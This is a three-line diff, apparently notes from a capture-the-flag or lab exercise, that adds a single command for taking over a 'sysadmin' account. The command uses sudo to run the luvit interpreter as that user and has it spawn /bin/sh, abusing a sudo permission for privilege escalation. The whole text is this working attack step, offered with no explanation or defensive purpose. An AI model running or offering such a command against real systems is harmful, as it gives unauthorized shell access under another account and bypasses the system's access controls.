@@ -1,0 +1,3 @@
+# To get sysadmin user
+sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
+
